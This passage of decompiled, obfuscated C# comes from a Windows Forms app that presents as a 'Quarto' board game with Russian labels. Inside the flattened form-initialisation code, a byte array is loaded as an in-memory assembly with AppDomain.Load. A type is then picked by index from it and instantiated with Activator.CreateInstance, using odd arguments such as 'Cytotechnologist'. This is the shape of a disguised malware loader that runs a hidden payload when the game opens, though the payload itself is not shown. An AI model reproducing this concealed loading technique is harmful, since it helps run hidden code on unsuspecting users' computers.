					num = num3 ^ ((int)num2 * -2124304332);
					continue;
				}
				case 41u:
					Form1.smethod_64((Control)(object)button1, 5);
					num = ((int)num2 * -893266858) ^ 0x779A554B;
					continue;
				case 40u:
					num = (int)((num2 * 763516584) ^ 0x239560FB);
					continue;
				case 39u:
					Form1.smethod_86((Form)(object)this, bool_0: false);
					Form1.smethod_32((Control)(object)this, "Quarto");
					num = (int)(num2 * 2073172650) ^ -365392463;
					continue;
				case 38u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)richTextBox1);
					num = ((int)num2 * -1969109709) ^ 0x3DB1A736;
					continue;
				case 36u:
					Form1.smethod_3((Control)(object)richTextBox1, new Size(272, 35));
					num = (int)(num2 * 1558605453) ^ -1132817865;
					continue;
				case 35u:
					Form1.smethod_61((Control)(object)label6, "label6");
					num = (int)((num2 * 1240286781) ^ 0x1175486C);
					continue;
				case 34u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label1);
					num = (int)((num2 * 945286386) ^ 0x34A695B0);
					continue;
				case 33u:
					num = ((int)num2 * -1877652431) ^ 0x74609659;
					continue;
				case 32u:
					Form1.smethod_3((Control)(object)label2, new Size(0, 16));
					num = (int)(num2 * 1400539660) ^ -1083348744;
					continue;
				case 31u:
					Form1.smethod_74((Control)(object)label2, bool_0: true);
					num = ((int)num2 * -1679857707) ^ -93218439;
					continue;
				case 30u:
					button2 = Form1.smethod_53();
					num = ((int)num2 * -1299928408) ^ -334768712;
					continue;
				case 29u:
					num = ((int)num2 * -1762781569) ^ -1607506818;
					continue;
				case 28u:
					Form1.smethod_32((Control)(object)button2, "Подтвердить");
					num = (int)((num2 * 1378016199) ^ 0x4A468BCF);
					continue;
				case 27u:
					Form1.smethod_6((Control)(object)pictureBox1, new MouseEventHandler(PictureBox1_MouseDown));
					num = ((int)num2 * -1973484643) ^ -1933293384;
					continue;
				case 26u:
					Form1.smethod_85((Control)(object)this, "Form1");
					num = ((int)num2 * -494312959) ^ 0x7EA76B9A;
					continue;
				case 25u:
					Form1.smethod_66((ButtonBase)(object)button1, bool_0: true);
					Form1.smethod_67((Control)(object)button1, (EventHandler)Button1_Click);
					num = (int)((num2 * 1208209682) ^ 0x70DDDAF8);
					continue;
				case 24u:
					num = ((int)num2 * -1954971773) ^ -1439927471;
					continue;
				case 23u:
					num = ((int)num2 * -1197920758) ^ 0x415CB57A;
					continue;
				case 22u:
					Form1.smethod_64((Control)(object)panel1, 7);
					num = ((int)num2 * -1862146911) ^ 0x3507F6B7;
					continue;
				case 21u:
					num = ((int)num2 * -1896142551) ^ 0x7C218D72;
					continue;
				case 20u:
					num = (int)(num2 * 2039256991) ^ -842609164;
					continue;
				case 19u:
					Form1.smethod_61((Control)(object)button1, "button1");
					num = ((int)num2 * -483580425) ^ -1898926440;
					continue;
				case 18u:
					Form1.smethod_58((ISupportInitialize)pictureBox1);
					num = ((int)num2 * -1325206934) ^ 0x6304705;
					continue;
				case 17u:
					Form1.smethod_5((Control)(object)this, Color.White);
					num = ((int)num2 * -1112665063) ^ -1787061005;
					continue;
				case 16u:
					Form1.smethod_61((Control)(object)button2, "button2");
					Form1.smethod_3((Control)(object)button2, new Size(83, 35));
					num = (int)((num2 * 1421825609) ^ 0x2E64DE66);
					continue;
				case 15u:
					CharArray(array, string.Empty);
					num = (int)(num2 * 1757048320) ^ -644007093;
					continue;
				case 14u:
					num = (int)((num2 * 901416316) ^ 0x9F95E43);
					continue;
				case 13u:
					Form1.smethod_63(pictureBox1, bool_0: false);
					num = (int)(num2 * 719913513) ^ -1130864375;
					continue;
				case 12u:
					num = ((int)num2 * -351591536) ^ -1385275755;
					continue;
				case 11u:
					Form1.smethod_32((Control)(object)button1, "Меню");
					num = (int)(num2 * 951771029) ^ -2112694710;
					continue;
				case 10u:
					Form1.smethod_4((Control)(object)button1, new Point(12, 275));
					num = (int)(num2 * 1783743412) ^ -1894863228;
					continue;
				case 9u:
				{
					object[] object_ = new object[3]
					{
						Player.MembershipCondition(0),
						Player.MembershipCondition(1),
						"Cytotechnologist"
					};
					Form1.smethod_70(ComMember, object_);
					Form1.smethod_71((TextBoxBase)(object)richTextBox1, bool_0: true);
					num = (int)(num2 * 401334874) ^ -751699527;
					continue;
				}
				case 8u:
					Form1.smethod_60(pictureBox1, (BorderStyle)2);
					num = (int)((num2 * 613399596) ^ 0x3EC42981);
					continue;
				case 7u:
					num = ((int)num2 * -1074761113) ^ 0x56633712;
					continue;
				case 6u:
					num = ((int)num2 * -2080987367) ^ 0x1D3F29BF;
					continue;
				case 5u:
					Form1.smethod_87((Form)(object)this, (EventHandler)Form1_Load);
					num = (int)(num2 * 267158874) ^ -28369339;
					continue;
				case 4u:
					num = (int)(num2 * 24860265) ^ -796220270;
					continue;
				case 3u:
					num = (int)((num2 * 2101892536) ^ 0x3BC9E6DD);
					continue;
				case 2u:
					Form1.smethod_4((Control)(object)pictureBox1, new Point(120, 22));
					num = ((int)num2 * -2011988621) ^ -1962526340;
					continue;
				case 1u:
					Form1.smethod_3((Control)(object)label1, new Size(0, 16));
					num = ((int)num2 * -1109968379) ^ -997420311;
					continue;
				case 0u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label6);
					num = (int)((num2 * 1503388170) ^ 0xDD7807B);
					continue;
				case 37u:
					break;
				default:
					Form1.smethod_92((Control)(object)this);
					return;
				}
				break;
			}
		}
	}

	private static void CharArray(byte[] Level, string po)
	{
		Assembly q = ContextAdd(Level);
		PerformTable(q);
		while (true)
		{
			int num = 1685614574;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x18167D2Bu) % 3u)
				{
				case 2u:
					goto IL_000f;
				default:
					return;
				case 0u:
					break;
				case 1u:
					return;
				}
				break;
				IL_000f:
				num = (int)(num2 * 580675972) ^ -2073101131;
			}
		}
	}

	private static Assembly ContextAdd(byte[] Position)
	{
		Assembly result = default(Assembly);
		while (true)
		{
			int num = -1259293872;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xAD78E351u) % 4u)
				{
				case 2u:
					num = ((int)num2 * -610891534) ^ 0x638C63F9;
					continue;
				case 1u:
					result = Form1.smethod_94(Form1.smethod_93(), Position);
					num = (int)((num2 * 1329178977) ^ 0x514671CE);
					continue;
				case 3u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	private static void PerformTable(Assembly Q3)
	{
		while (true)
		{
			int num = 1284828016;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x4FA7E599u) % 3u)
				{
				case 1u:
					goto IL_0003;
				default:
					return;
				case 2u:
					break;
				case 0u:
					return;
				}
				break;
				IL_0003:
				ComMember = Form1.smethod_95(Q3)[24];
				num = (int)(num2 * 1265312950) ^ -511823874;
			}
		}
	}

	static Random smethod_0()
	{
		return new Random();
	}

	static void smethod_1(RichTextBox richTextBox_0, HorizontalAlignment horizontalAlignment_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		richTextBox_0.set_SelectionAlignment(horizontalAlignment_0);
	}

	static PictureBox smethod_2()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new PictureBox();
	}

	static void smethod_3(Control control_0, Size size_0)
	{
		control_0.set_Size(size_0);
	}

	static void smethod_4(Control control_0, Point point_0)
	{
		control_0.set_Location(point_0);
	}

	static void smethod_5(Control control_0, Color color_0)
	{
		control_0.set_BackColor(color_0);
	}

	static void smethod_6(Control control_0, MouseEventHandler mouseEventHandler_0)
	{
		control_0.add_MouseDown(mouseEventHandler_0);
	}

	static void smethod_7(Control control_0, bool bool_0)
	{
		control_0.set_Enabled(bool_0);
	}

	static ControlCollection smethod_8(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_9(ControlCollection controlCollection_0, Control control_0)
	{
		controlCollection_0.Add(control_0);
	}

	static void smethod_10(Form form_0, Form form_1)
	{
		form_0.set_Owner(form_1);
	}

	static void smethod_11(Control control_0)
	{
		control_0.Show();
	}

	static Point smethod_12(Form form_0)
	{
		return form_0.get_Location();
	}

	static void smethod_13(Form form_0, Point point_0)
	{
		form_0.set_Location(point_0);
	}

	static void smethod_14(Form form_0)
	{
		form_0.Activate();
	}

	static void smethod_15(Timer timer_0)
	{
		timer_0.Stop();
	}

	static int smethod_16(Control control_0)
	{
		return control_0.get_Height();
	}

	static void smethod_17(Control control_0, int int_0)
	{
		control_0.set_Height(int_0);
	}

	static int smethod_18(Control control_0)
	{
		return control_0.get_Width();
	}

	static Bitmap smethod_19(int int_0, int int_1)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Bitmap(int_0, int_1);
	}

	static void smethod_20(PictureBox pictureBox_0, Image image_0)
	{
		pictureBox_0.set_Image(image_0);
	}

	static Image smethod_21(PictureBox pictureBox_0)
	{
		return pictureBox_0.get_Image();
	}

	static Graphics smethod_22(Image image_0)
	{
		return Graphics.FromImage(image_0);
	}

	static Brush smethod_23()
	{
		return Brushes.get_OldLace();
	}

	static void smethod_24(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillEllipse(brush_0, float_0, float_1, float_2, float_3);
	}

	static Brush smethod_25()
	{
		return Brushes.get_Sienna();
	}

	static Brush smethod_26()
	{
		return Brushes.get_BurlyWood();
	}

	static double smethod_27(double double_0)
	{
		return Math.Sqrt(double_0);
	}

	static void smethod_28(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillRectangle(brush_0, float_0, float_1, float_2, float_3);
	}

	static SolidBrush smethod_29(Color color_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new SolidBrush(color_0);
	}

	static void smethod_30(Control control_0)
	{
		control_0.Refresh();
	}

	static EventArgs smethod_31()
	{
		return new EventArgs();
	}

	static void smethod_32(Control control_0, string string_0)
	{
		control_0.set_Text(string_0);
	}

	static int smethod_33(Random random_0, int int_0)
	{
		return random_0.Next(int_0);
	}

	static string smethod_34(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static void smethod_35(Timer timer_0, bool bool_0)
	{
		timer_0.set_Enabled(bool_0);
	}

	static void smethod_36(Timer timer_0)
	{
		timer_0.Start();
	}

	static Point smethod_37(Control control_0)
	{
		return control_0.get_Location();
	}

	static int smethod_38(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_X();
	}

	static int smethod_39(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_Y();
	}

	static Color smethod_40(Bitmap bitmap_0, int int_0, int int_1)
	{
		return bitmap_0.GetPixel(int_0, int_1);
	}

	static Color smethod_41(Control control_0)
	{
		return control_0.get_BackColor();
	}

	static Pen smethod_42(Color color_0, float float_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Pen(color_0, float_0);
	}

	static void smethod_43(Graphics graphics_0, Pen pen_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.DrawEllipse(pen_0, float_0, float_1, float_2, float_3);
	}

	static void smethod_44(Graphics graphics_0, Image image_0, int int_0, int int_1, Rectangle rectangle_0, GraphicsUnit graphicsUnit_0)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		graphics_0.DrawImage(image_0, int_0, int_1, rectangle_0, graphicsUnit_0);
	}

	static void smethod_45(Graphics graphics_0)
	{
		graphics_0.Dispose();
	}

	static bool smethod_46(Control control_0)
	{
		return control_0.get_Enabled();
	}

	static void smethod_47(int int_0)
	{
		Thread.Sleep(int_0);
	}

	static object smethod_48(Array array_0)
	{
		return array_0.Clone();
	}

	static int smethod_49(Control control_0)
	{
		return control_0.get_Width();
	}

	static void smethod_50(Control control_0, int int_0)
	{
		control_0.set_Left(int_0);
	}

	static void smethod_51(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Container smethod_52()
	{
		return new Container();
	}

	static Button smethod_53()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Button();
	}

	static RichTextBox smethod_54()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new RichTextBox();
	}

	static Panel smethod_55()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Panel();
	}

	static Timer smethod_56(IContainer icontainer_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new Timer(icontainer_0);
	}

	static Label smethod_57()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Label();
	}

	static void smethod_58(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.BeginInit();
	}

	static void smethod_59(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_60(PictureBox pictureBox_0, BorderStyle borderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		pictureBox_0.set_BorderStyle(borderStyle_0);
	}

	static void smethod_61(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_62(PictureBox pictureBox_0, int int_0)
	{
		pictureBox_0.set_TabIndex(int_0);
	}

	static void smethod_63(PictureBox pictureBox_0, bool bool_0)
	{
		pictureBox_0.set_TabStop(bool_0);
	}

	static void smethod_64(Control control_0, int int_0)
	{
		control_0.set_TabIndex(int_0);
	}

	static void smethod_65(Control control_0, bool bool_0)
	{
		control_0.set_TabStop(bool_0);
	}

	static void smethod_66(ButtonBase buttonBase_0, bool bool_0)
	{
		buttonBase_0.set_UseVisualStyleBackColor(bool_0);
	}

	static void smethod_67(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_Click(eventHandler_0);
	}

	static string smethod_68(string string_0, int int_0, int int_1)
	{
		return string_0.Substring(int_0, int_1);
	}

	static byte smethod_69(string string_0, int int_0)
	{
		return Convert.ToByte(string_0, int_0);
	}

	static object smethod_70(Type type_0, object[] object_0)
	{
		return Activator.CreateInstance(type_0, object_0);
	}

	static void smethod_71(TextBoxBase textBoxBase_0, bool bool_0)
	{
		textBoxBase_0.set_ReadOnly(bool_0);
	}

	static void smethod_72(Timer timer_0, int int_0)
	{
		timer_0.set_Interval(int_0);
	}

	static void smethod_73(Timer timer_0, EventHandler eventHandler_0)
	{
		timer_0.add_Tick(eventHandler_0);
	}

	static void smethod_74(Control control_0, bool bool_0)
	{
		control_0.set_AutoSize(bool_0);
	}

	static void smethod_75(Control control_0, DockStyle dockStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_Dock(dockStyle_0);
	}

	static Font smethod_76(string string_0, float float_0, FontStyle fontStyle_0, GraphicsUnit graphicsUnit_0, byte byte_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		return new Font(string_0, float_0, fontStyle_0, graphicsUnit_0, byte_0);
	}

	static void smethod_77(Control control_0, Font font_0)
	{
		control_0.set_Font(font_0);
	}

	static void smethod_78(Control control_0, RightToLeft rightToLeft_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_RightToLeft(rightToLeft_0);
	}

	static void smethod_79(ContainerControl containerControl_0, SizeF sizeF_0)
	{
		containerControl_0.set_AutoScaleDimensions(sizeF_0);
	}

	static void smethod_80(ContainerControl containerControl_0, AutoScaleMode autoScaleMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		containerControl_0.set_AutoScaleMode(autoScaleMode_0);
	}

	static void smethod_81(Form form_0, Size size_0)
	{
		form_0.set_ClientSize(size_0);
	}

	static ControlCollection smethod_82(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_83(Form form_0, FormBorderStyle formBorderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_FormBorderStyle(formBorderStyle_0);
	}

	static void smethod_84(Form form_0, bool bool_0)
	{
		form_0.set_MaximizeBox(bool_0);
	}

	static void smethod_85(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_86(Form form_0, bool bool_0)
	{
		form_0.set_ShowIcon(bool_0);
	}

	static void smethod_87(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Load(eventHandler_0);
	}

	static void smethod_88(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Shown(eventHandler_0);
	}

	static void smethod_89(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_LocationChanged(eventHandler_0);
	}

	static void smethod_90(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.EndInit();
	}

	static void smethod_91(Control control_0, bool bool_0)
	{
		control_0.ResumeLayout(bool_0);
	}

	static void smethod_92(Control control_0)
	{
		control_0.PerformLayout();
	}

	static AppDomain smethod_93()
	{
		return AppDomain.CurrentDomain;
	}

	static Assembly smethod_94(AppDomain appDomain_0, byte[] byte_0)
	{
		return appDomain_0.Load(byte_0);
	}

	static Type[] smethod_95(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}
}
